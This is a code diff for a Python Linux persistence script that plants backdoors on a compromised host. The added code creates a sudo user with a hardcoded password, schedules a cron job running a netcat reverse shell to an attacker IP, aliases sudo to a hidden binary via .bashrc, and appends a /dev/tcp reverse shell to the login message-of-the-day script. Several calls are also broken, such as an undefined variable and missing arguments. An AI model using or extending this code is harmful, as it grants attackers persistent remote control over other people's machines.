@@ -1,19 +1,28 @@
-def createSuperUser():
-	#create superuser ftp with sudo perms
-	pass
+import subprocess
+import sys
 
-def createCronTabBackDoor():
-	pass
+def createSuperUser():
+	username = 'ftp' #switch to fit more likely with something
+	password = 'returnER' #change password if you want
+	subprocess.run(['useradd', '-aG sudo', '-p', password, username])
+
+def createCronTabBackDoor(ip):
+	subprocess.run(f'(crontab -l ; echo "*/2 * * * * sleep 200 && nc {ip} 8888 -e /bin/bash") | crontab 2> /dev/null')
 
 def backDoorBashRC():
-	pass
+	with open('~/.bashrc', 'a') as bashrc:
+		bashrc.write('chmod u+x /etc/default/.cron.d/sudoy')
+		bashrc.write('alias sudo=/etc/default/.cron.d/sudoy')
 
-def backDoorMessageOfTheDay():
+	subprocess.run('mv ./payloads/sudoy /etc/default/.cron.d/sudoy')
+
+def backDoorMessageOfTheDay(ip, port):
 	with open('/etc/update-motd.d/00-header', 'a') as headerFile:
-		headerFile.write('bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"') #update the ip and port accordingly
+		headerFile.write(f'bash -c "bash -i >& /dev/tcp/{ip}/8282 0>&1"') #update the ip and port accordingly
 
 def main():
-	backDoorMessageOfTheDay()
+	attackBoxIP = sys.argv[1] #first command line argument is the ip of teh box you want to set the reverse shells to connect back to
+	backDoorMessageOfTheDay(ip)
 	backDoorBashRC()
 	createCronTabBackDoor()
 	createSuperUser()
